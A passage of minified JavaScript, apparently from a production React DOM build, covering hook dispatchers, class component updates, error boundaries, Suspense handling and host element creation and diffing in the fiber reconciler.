t=t(),e.current=t,function(){e.current=null}}function qC(t,e,n){return n=n!=null?n.concat([t]):null,oh(4,4,GC.bind(null,e,t),n)}function Zg(){}function YC(t,e){var n=vn();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&Yg(e,r[1])?r[0]:(n.memoizedState=[t,e],t)}function QC(t,e){var n=vn();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&Yg(e,r[1])?r[0]:(t=t(),n.memoizedState=[t,e],t)}function XC(t,e,n){return Es&21?(Mn(n,e)||(n=nC(),Fe.lanes|=n,Cs|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,Bt=!0),t.memoizedState=n)}function bR(t,e){var n=xe;xe=n!==0&&4>n?n:4,t(!0);var r=$f.transition;$f.transition={};try{t(!1),e()}finally{xe=n,$f.transition=r}}function JC(){return vn().memoizedState}function TR(t,e,n){var r=Ei(t);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},ZC(t))eS(e,n);else if(n=DC(t,e,n,r),n!==null){var i=Rt();Dn(n,t,r,i),tS(n,e,r)}}function IR(t,e,n){var r=Ei(t),i={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(ZC(t))eS(e,i);else{var s=t.alternate;if(t.lanes===0&&(s===null||s.lanes===0)&&(s=e.lastRenderedReducer,s!==null))try{var o=e.lastRenderedState,a=s(o,n);if(i.hasEagerState=!0,i.eagerState=a,Mn(a,o)){var c=e.interleaved;c===null?(i.next=i,Hg(e)):(i.next=c.next,c.next=i),e.interleaved=i;return}}catch{}finally{}n=DC(t,e,i,r),n!==null&&(i=Rt(),Dn(n,t,r,i),tS(n,e,r))}}function ZC(t){var e=t.alternate;return t===Fe||e!==null&&e===Fe}function eS(t,e){rl=hd=!0;var n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function tS(t,e,n){if(n&4194240){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,Pg(t,n)}}var fd={readContext:gn,useCallback:_t,useContext:_t,useEffect:_t,useImperativeHandle:_t,useInsertionEffect:_t,useLayoutEffect:_t,useMemo:_t,useReducer:_t,useRef:_t,useState:_t,useDebugValue:_t,useDeferredValue:_t,useTransition:_t,useMutableSource:_t,useSyncExternalStore:_t,useId:_t,unstable_isNewReconciler:!1},NR={readContext:gn,useCallback:function(t,e){return Gn().memoizedState=[t,e===void 0?null:e],t},useContext:gn,useEffect:E_,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,ku(4194308,4,GC.bind(null,e,t),n)},useLayoutEffect:function(t,e){return ku(4194308,4,t,e)},useInsertionEffect:function(t,e){return ku(4,2,t,e)},useMemo:function(t,e){var n=Gn();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var r=Gn();return e=n!==void 0?n(e):e,r.memoizedState=r.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},r.queue=t,t=t.dispatch=TR.bind(null,Fe,t),[r.memoizedState,t]},useRef:function(t){var e=Gn();return t={current:t},e.memoizedState=t},useState:x_,useDebugValue:Zg,useDeferredValue:function(t){return Gn().memoizedState=t},useTransition:function(){var t=x_(!1),e=t[0];return t=bR.bind(null,t[1]),Gn().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var r=Fe,i=Gn();if(Me){if(n===void 0)throw Error($(407));n=n()}else{if(n=e(),ot===null)throw Error($(349));Es&30||UC(r,e,n)}i.memoizedState=n;var s={value:n,getSnapshot:e};return i.queue=s,E_(zC.bind(null,r,s,t),[t]),r.flags|=2048,Al(9,$C.bind(null,r,s,n,e),void 0,null),n},useId:function(){var t=Gn(),e=ot.identifierPrefix;if(Me){var n=_r,r=yr;n=(r&~(1<<32-On(r)-1)).toString(32)+n,e=":"+e+"R"+n,n=Pl++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=SR++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},kR={readContext:gn,useCallback:YC,useContext:gn,useEffect:Jg,useImperativeHandle:qC,useInsertionEffect:WC,useLayoutEffect:KC,useMemo:QC,useReducer:zf,useRef:HC,useState:function(){return zf(Rl)},useDebugValue:Zg,useDeferredValue:function(t){var e=vn();return XC(e,Ze.memoizedState,t)},useTransition:function(){var t=zf(Rl)[0],e=vn().memoizedState;return[t,e]},useMutableSource:LC,useSyncExternalStore:FC,useId:JC,unstable_isNewReconciler:!1},PR={readContext:gn,useCallback:YC,useContext:gn,useEffect:Jg,useImperativeHandle:qC,useInsertionEffect:WC,useLayoutEffect:KC,useMemo:QC,useReducer:Bf,useRef:HC,useState:function(){return Bf(Rl)},useDebugValue:Zg,useDeferredValue:function(t){var e=vn();return Ze===null?e.memoizedState=t:XC(e,Ze.memoizedState,t)},useTransition:function(){var t=Bf(Rl)[0],e=vn().memoizedState;return[t,e]},useMutableSource:LC,useSyncExternalStore:FC,useId:JC,unstable_isNewReconciler:!1};function Cn(t,e){if(t&&t.defaultProps){e=Ue({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}function rm(t,e,n,r){e=t.memoizedState,n=n(r,e),n=n==null?e:Ue({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var ah={isMounted:function(t){return(t=t._reactInternals)?Os(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var r=Rt(),i=Ei(t),s=Cr(r,i);s.payload=e,n!=null&&(s.callback=n),e=wi(t,s,i),e!==null&&(Dn(e,t,i,r),Iu(e,t,i))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var r=Rt(),i=Ei(t),s=Cr(r,i);s.tag=1,s.payload=e,n!=null&&(s.callback=n),e=wi(t,s,i),e!==null&&(Dn(e,t,i,r),Iu(e,t,i))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=Rt(),r=Ei(t),i=Cr(n,r);i.tag=2,e!=null&&(i.callback=e),e=wi(t,i,r),e!==null&&(Dn(e,t,r,n),Iu(e,t,r))}};function C_(t,e,n,r,i,s,o){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(r,s,o):e.prototype&&e.prototype.isPureReactComponent?!Sl(n,r)||!Sl(i,s):!0}function nS(t,e,n){var r=!1,i=Di,s=e.contextType;return typeof s=="object"&&s!==null?s=gn(s):(i=Wt(e)?ws:Ct.current,r=e.contextTypes,s=(r=r!=null)?Ao(t,i):Di),e=new e(n,s),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=ah,t.stateNode=e,e._reactInternals=t,r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=i,t.__reactInternalMemoizedMaskedChildContext=s),e}function S_(t,e,n,r){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,r),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,r),e.state!==t&&ah.enqueueReplaceState(e,e.state,null)}function im(t,e,n,r){var i=t.stateNode;i.props=n,i.state=t.memoizedState,i.refs={},Wg(t);var s=e.contextType;typeof s=="object"&&s!==null?i.context=gn(s):(s=Wt(e)?ws:Ct.current,i.context=Ao(t,s)),i.state=t.memoizedState,s=e.getDerivedStateFromProps,typeof s=="function"&&(rm(t,e,s,n),i.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(e=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),e!==i.state&&ah.enqueueReplaceState(i,i.state,null),ud(t,n,i,r),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308)}function Mo(t,e){try{var n="",r=e;do n+=iP(r),r=r.return;while(r);var i=n}catch(s){i=`
Error generating stack: `+s.message+`
`+s.stack}return{value:t,source:e,stack:i,digest:null}}function Vf(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function sm(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var RR=typeof WeakMap=="function"?WeakMap:Map;function rS(t,e,n){n=Cr(-1,n),n.tag=3,n.payload={element:null};var r=e.value;return n.callback=function(){md||(md=!0,mm=r),sm(t,e)},n}function iS(t,e,n){n=Cr(-1,n),n.tag=3;var r=t.type.getDerivedStateFromError;if(typeof r=="function"){var i=e.value;n.payload=function(){return r(i)},n.callback=function(){sm(t,e)}}var s=t.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(n.callback=function(){sm(t,e),typeof r!="function"&&(xi===null?xi=new Set([this]):xi.add(this));var o=e.stack;this.componentDidCatch(e.value,{componentStack:o!==null?o:""})}),n}function b_(t,e,n){var r=t.pingCache;if(r===null){r=t.pingCache=new RR;var i=new Set;r.set(e,i)}else i=r.get(e),i===void 0&&(i=new Set,r.set(e,i));i.has(n)||(i.add(n),t=WR.bind(null,t,e,n),e.then(t,t))}function T_(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function I_(t,e,n,r,i){return t.mode&1?(t.flags|=65536,t.lanes=i,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=Cr(-1,1),e.tag=2,wi(n,e,1))),n.lanes|=1),t)}var AR=Lr.ReactCurrentOwner,Bt=!1;function It(t,e,n,r){e.child=t===null?OC(e,null,n,r):Do(e,t.child,n,r)}function N_(t,e,n,r,i){n=n.render;var s=e.ref;return ho(e,i),r=Qg(t,e,n,r,s,i),n=Xg(),t!==null&&!Bt?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,Pr(t,e,i)):(Me&&n&&Fg(e),e.flags|=1,It(t,e,r,i),e.child)}function k_(t,e,n,r,i){if(t===null){var s=n.type;return typeof s=="function"&&!av(s)&&s.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=s,sS(t,e,s,r,i)):(t=Ou(n.type,null,r,e,e.mode,i),t.ref=e.ref,t.return=e,e.child=t)}if(s=t.child,!(t.lanes&i)){var o=s.memoizedProps;if(n=n.compare,n=n!==null?n:Sl,n(o,r)&&t.ref===e.ref)return Pr(t,e,i)}return e.flags|=1,t=Ci(s,r),t.ref=e.ref,t.return=e,e.child=t}function sS(t,e,n,r,i){if(t!==null){var s=t.memoizedProps;if(Sl(s,r)&&t.ref===e.ref)if(Bt=!1,e.pendingProps=r=s,(t.lanes&i)!==0)t.flags&131072&&(Bt=!0);else return e.lanes=t.lanes,Pr(t,e,i)}return om(t,e,n,r,i)}function oS(t,e,n){var r=e.pendingProps,i=r.children,s=t!==null?t.memoizedState:null;if(r.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},Pe(io,Qt),Qt|=n;else{if(!(n&1073741824))return t=s!==null?s.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,Pe(io,Qt),Qt|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=s!==null?s.baseLanes:n,Pe(io,Qt),Qt|=r}else s!==null?(r=s.baseLanes|n,e.memoizedState=null):r=n,Pe(io,Qt),Qt|=r;return It(t,e,i,n),e.child}function aS(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function om(t,e,n,r,i){var s=Wt(n)?ws:Ct.current;return s=Ao(e,s),ho(e,i),n=Qg(t,e,n,r,s,i),r=Xg(),t!==null&&!Bt?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,Pr(t,e,i)):(Me&&r&&Fg(e),e.flags|=1,It(t,e,n,i),e.child)}function P_(t,e,n,r,i){if(Wt(n)){var s=!0;sd(e)}else s=!1;if(ho(e,i),e.stateNode===null)Pu(t,e),nS(e,n,r),im(e,n,r,i),r=!0;else if(t===null){var o=e.stateNode,a=e.memoizedProps;o.props=a;var c=o.context,u=n.contextType;typeof u=="object"&&u!==null?u=gn(u):(u=Wt(n)?ws:Ct.current,u=Ao(e,u));var p=n.getDerivedStateFromProps,f=typeof p=="function"||typeof o.getSnapshotBeforeUpdate=="function";f||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==r||c!==u)&&S_(e,o,r,u),ei=!1;var h=e.memoizedState;o.state=h,ud(e,r,o,i),c=e.memoizedState,a!==r||h!==c||Ht.current||ei?(typeof p=="function"&&(rm(e,n,p,r),c=e.memoizedState),(a=ei||C_(e,n,a,r,h,c,u))?(f||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(e.flags|=4194308)):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=r,e.memoizedState=c),o.props=r,o.state=c,o.context=u,r=a):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),r=!1)}else{o=e.stateNode,jC(t,e),a=e.memoizedProps,u=e.type===e.elementType?a:Cn(e.type,a),o.props=u,f=e.pendingProps,h=o.context,c=n.contextType,typeof c=="object"&&c!==null?c=gn(c):(c=Wt(n)?ws:Ct.current,c=Ao(e,c));var E=n.getDerivedStateFromProps;(p=typeof E=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==f||h!==c)&&S_(e,o,r,c),ei=!1,h=e.memoizedState,o.state=h,ud(e,r,o,i);var _=e.memoizedState;a!==f||h!==_||Ht.current||ei?(typeof E=="function"&&(rm(e,n,E,r),_=e.memoizedState),(u=ei||C_(e,n,u,r,h,_,c)||!1)?(p||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(r,_,c),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(r,_,c)),typeof o.componentDidUpdate=="function"&&(e.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof o.componentDidUpdate!="function"||a===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),e.memoizedProps=r,e.memoizedState=_),o.props=r,o.state=_,o.context=c,r=u):(typeof o.componentDidUpdate!="function"||a===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),r=!1)}return am(t,e,n,r,s,i)}function am(t,e,n,r,i,s){aS(t,e);var o=(e.flags&128)!==0;if(!r&&!o)return i&&m_(e,n,!1),Pr(t,e,s);r=e.stateNode,AR.current=e;var a=o&&typeof n.getDerivedStateFromError!="function"?null:r.render();return e.flags|=1,t!==null&&o?(e.child=Do(e,t.child,null,s),e.child=Do(e,null,a,s)):It(t,e,a,s),e.memoizedState=r.state,i&&m_(e,n,!0),e.child}function lS(t){var e=t.stateNode;e.pendingContext?p_(t,e.pendingContext,e.pendingContext!==e.context):e.context&&p_(t,e.context,!1),Kg(t,e.containerInfo)}function R_(t,e,n,r,i){return Oo(),$g(i),e.flags|=256,It(t,e,n,r),e.child}var lm={dehydrated:null,treeContext:null,retryLane:0};function cm(t){return{baseLanes:t,cachePool:null,transitions:null}}function cS(t,e,n){var r=e.pendingProps,i=Le.current,s=!1,o=(e.flags&128)!==0,a;if((a=o)||(a=t!==null&&t.memoizedState===null?!1:(i&2)!==0),a?(s=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(i|=1),Pe(Le,i&1),t===null)return tm(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(o=r.children,t=r.fallback,s?(r=e.mode,s=e.child,o={mode:"hidden",children:o},!(r&1)&&s!==null?(s.childLanes=0,s.pendingProps=o):s=uh(o,r,0,null),t=ys(t,r,n,null),s.return=e,t.return=e,s.sibling=t,e.child=s,e.child.memoizedState=cm(n),e.memoizedState=lm,t):ev(e,o));if(i=t.memoizedState,i!==null&&(a=i.dehydrated,a!==null))return OR(t,e,o,r,a,i,n);if(s){s=r.fallback,o=e.mode,i=t.child,a=i.sibling;var c={mode:"hidden",children:r.children};return!(o&1)&&e.child!==i?(r=e.child,r.childLanes=0,r.pendingProps=c,e.deletions=null):(r=Ci(i,c),r.subtreeFlags=i.subtreeFlags&14680064),a!==null?s=Ci(a,s):(s=ys(s,o,n,null),s.flags|=2),s.return=e,r.return=e,r.sibling=s,e.child=r,r=s,s=e.child,o=t.child.memoizedState,o=o===null?cm(n):{baseLanes:o.baseLanes|n,cachePool:null,transitions:o.transitions},s.memoizedState=o,s.childLanes=t.childLanes&~n,e.memoizedState=lm,r}return s=t.child,t=s.sibling,r=Ci(s,{mode:"visible",children:r.children}),!(e.mode&1)&&(r.lanes=n),r.return=e,r.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=r,e.memoizedState=null,r}function ev(t,e){return e=uh({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function nu(t,e,n,r){return r!==null&&$g(r),Do(e,t.child,null,n),t=ev(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function OR(t,e,n,r,i,s,o){if(n)return e.flags&256?(e.flags&=-257,r=Vf(Error($(422))),nu(t,e,o,r)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(s=r.fallback,i=e.mode,r=uh({mode:"visible",children:r.children},i,0,null),s=ys(s,i,o,null),s.flags|=2,r.return=e,s.return=e,r.sibling=s,e.child=r,e.mode&1&&Do(e,t.child,null,o),e.child.memoizedState=cm(o),e.memoizedState=lm,s);if(!(e.mode&1))return nu(t,e,o,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var a=r.dgst;return r=a,s=Error($(419)),r=Vf(s,r,void 0),nu(t,e,o,r)}if(a=(o&t.childLanes)!==0,Bt||a){if(r=ot,r!==null){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=i&(r.suspendedLanes|o)?0:i,i!==0&&i!==s.retryLane&&(s.retryLane=i,kr(t,i),Dn(r,t,i,-1))}return ov(),r=Vf(Error($(421))),nu(t,e,o,r)}return i.data==="$?"?(e.flags|=128,e.child=t.child,e=KR.bind(null,t),i._reactRetry=e,null):(t=s.treeContext,en=_i(i.nextSibling),tn=e,Me=!0,In=null,t!==null&&(un[dn++]=yr,un[dn++]=_r,un[dn++]=xs,yr=t.id,_r=t.overflow,xs=e),e=ev(e,r.children),e.flags|=4096,e)}function A_(t,e,n){t.lanes|=e;var r=t.alternate;r!==null&&(r.lanes|=e),nm(t.return,e,n)}function Hf(t,e,n,r,i){var s=t.memoizedState;s===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i}:(s.isBackwards=e,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=n,s.tailMode=i)}function uS(t,e,n){var r=e.pendingProps,i=r.revealOrder,s=r.tail;if(It(t,e,r.children,n),r=Le.current,r&2)r=r&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&A_(t,n,e);else if(t.tag===19)A_(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}r&=1}if(Pe(Le,r),!(e.mode&1))e.memoizedState=null;else switch(i){case"forwards":for(n=e.child,i=null;n!==null;)t=n.alternate,t!==null&&dd(t)===null&&(i=n),n=n.sibling;n=i,n===null?(i=e.child,e.child=null):(i=n.sibling,n.sibling=null),Hf(e,!1,i,n,s);break;case"backwards":for(n=null,i=e.child,e.child=null;i!==null;){if(t=i.alternate,t!==null&&dd(t)===null){e.child=i;break}t=i.sibling,i.sibling=n,n=i,i=t}Hf(e,!0,n,null,s);break;case"together":Hf(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function Pu(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function Pr(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),Cs|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error($(153));if(e.child!==null){for(t=e.child,n=Ci(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=Ci(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function DR(t,e,n){switch(e.tag){case 3:lS(e),Oo();break;case 5:MC(e);break;case 1:Wt(e.type)&&sd(e);break;case 4:Kg(e,e.stateNode.containerInfo);break;case 10:var r=e.type._context,i=e.memoizedProps.value;Pe(ld,r._currentValue),r._currentValue=i;break;case 13:if(r=e.memoizedState,r!==null)return r.dehydrated!==null?(Pe(Le,Le.current&1),e.flags|=128,null):n&e.child.childLanes?cS(t,e,n):(Pe(Le,Le.current&1),t=Pr(t,e,n),t!==null?t.sibling:null);Pe(Le,Le.current&1);break;case 19:if(r=(n&e.childLanes)!==0,t.flags&128){if(r)return uS(t,e,n);e.flags|=128}if(i=e.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),Pe(Le,Le.current),r)break;return null;case 22:case 23:return e.lanes=0,oS(t,e,n)}return Pr(t,e,n)}var dS,um,hS,fS;dS=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};um=function(){};hS=function(t,e,n,r){var i=t.memoizedProps;if(i!==r){t=e.stateNode,ds(er.current);var s=null;switch(n){case"input":i=Ap(t,i),r=Ap(t,r),s=[];break;case"select":i=Ue({},i,{value:void 0}),r=Ue({},r,{value:void 0}),s=[];break;case"textarea":i=jp(t,i),r=jp(t,r),s=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(t.onclick=rd)}Lp(n,r);var o;n=null;for(u in i)if(!r.hasOwnProperty(u)&&i.hasOwnProperty(u)&&i[u]!=null)if(u==="style"){var a=i[u];for(o in a)a.hasOwnProperty(o)&&(n||(n={}),n[o]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(vl.hasOwnProperty(u)?s||(s=[]):(s=s||[]).push(u,null));for(u in r){var c=r[u];if(a=i!=null?i[u]:void 0,r.hasOwnProperty(u)&&c!==a&&(c!=null||a!=null))if(u==="style")if(a){for(o in a)!a.hasOwnProperty(o)||c&&c.hasOwnProperty(o)||(n||(n={}),n[o]="");for(o in c)c.hasOwnProperty(o)&&a[o]!==c[o]&&(n||(n={}),n[o]=c[o])}else n||(s||(s=[]),s.push(u,n)),n=c;else u==="dangerouslySetInnerHTML"?(c=c?c.__html:void 0,a=a?a.__html:void 0,c!=null&&a!==c&&(s=s||[]).push(u,c)):u==="children"?typeof c!="string"&&typeof c!="number"||(s=s||[]).push(u,""+c):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(vl.hasOwnProperty(u)?(c!=null&&u==="onScroll"&&De("scroll",t),s||a===c||(s=[])):(s=s||[]).push(u,c))}n&&(s=s||[]).push("style",n);var u=s;(e.updateQueue=u)&&(e.flags|=4)}};fS=function(t,e,n,r){n!==r&&(e.flags|=4)};function Fa(t,e){if(!Me)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:r.sibling=null}}function wt(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,r=0;if(e)for(var i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=t,i=i.sibling;else for(i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=t,i=i.sibling;return t.subtreeFlags|=r,t.childLanes=n,e}function jR(t,e,n){var r=e.pendingProps;switch(Ug(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return wt(e),null;case 1:return Wt(e.type)&&id(),wt(e),null;case 3:return r=e.stateNode,jo(),je(Ht),je(Ct),qg(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(t===null||t.child===null)&&(eu(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,In!==null&&(ym(In),In=null))),um(t,e),wt(e),null;case 5:Gg(e);var i=ds(kl.current);if(n=e.type,t!==null&&e.stateNode!=null)hS(t,e,n,r,i),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!r){if(e.stateNode===null)throw Error($(166));return wt(e),null}if(t=ds(er.current),eu(e)){r=e.stateNode,n=e.type;var s=e.memoizedProps;switch(r[Xn]=e,r[Il]=s,t=(e.mode&1)!==0,n){case"dialog":De("cancel",r),De("close",r);break;case"iframe":case"object":case"embed":De("load",r);break;case"video":case"audio":for(i=0;i<Ya.length;i++)De(Ya[i],r);break;case"source":De("error",r);break;case"img":case"image":case"link":De("error",r),De("load",r);break;case"details":De("toggle",r);break;case"input":z0(r,s),De("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},De("invalid",r);break;case"textarea":V0(r,s),De("invalid",r)}Lp(n,s),i=null;for(var o in s)if(s.hasOwnProperty(o)){var a=s[o];o==="children"?typeof a=="string"?r.textContent!==a&&(s.suppressHydrationWarning!==!0&&Zc(r.textContent,a,t),i=["children",a]):typeof a=="number"&&r.textContent!==""+a&&(s.suppressHydrationWarning!==!0&&Zc(r.textContent,a,t),i=["children",""+a]):vl.hasOwnProperty(o)&&a!=null&&o==="onScroll"&&De("scroll",r)}switch(n){case"input":Wc(r),B0(r,s,!0);break;case"textarea":Wc(r),H0(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=rd)}r=i,e.updateQueue=r,r!==null&&(e.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=zE(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=o.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof r.is=="string"?t=o.createElement(n,{is:r.is}):(t=o.createElement(n),n==="select"&&(o=t,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):t=o.createElementNS(t,n),t[Xn]=e,t[Il]=r,dS(t,e,!1,!1),e.stateNode=t;e:{switch(o=Fp(n,r),n){case"dialog":De("cancel",t),De("close",t),i=r;break;case"iframe":case"object":case"embed":De("load",t),i=r;break;case"video":case"audio":for(i=0;i<Ya.length;i++)De(Ya[i],t);i=r;break;case"source":De("error",t),i=r;break;case"img":case"image":case"link":De("error",t),De("load",t),i=r;break;case"details":De("toggle",t),i=r;break;case"input":z0(t,r),i=Ap(t,r),De("invalid",t);break;case"option":i=r;break;case"select":t._wrapperState={wasMultiple:!!r.multiple},i=Ue({},r,{value:void 0}),De("invalid",t);break;case"textarea":V0(t,r),i=jp(t,r),De("invalid",t);break;default:i=r}Lp(n,i),a=i;for(s in a)if(a.hasOwnProperty(s)){var c=a[s];s==="style"?HE(t,c):s==="dangerouslySetInnerHTML"?(c=c?c.__html:void 0,c!=null&&BE(t,c)):s==="children"?typeof c=="string"?(n!=="textarea"||c!=="")&&yl(t,c):typeof c=="number"&&yl(t,""+c):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(vl.hasOwnProperty(s)?c!=null&&s==="onScroll"&&De("scroll",t):c!=null&&Sg(t,s,c,o))}switch(n){case"input":Wc(t),B0(t,r,!1);break;case"textarea":Wc(t),H0(t);break;case"option":r.value!=null&&t.setAttribute("value",""+Oi(r.value));break;case"select":t.multiple=!!r.multiple,s=r.value,s!=null?ao(t,!!r.multiple,s,!1):r.defaultValue!=null&&ao(t,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(t.onclick=rd)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return wt(e),null;case 6:if(t&&e.stateNode!=null)fS(t,e,t.memoizedProps,r);else{if(typeof r!="string"&&e.stateNode===null)throw 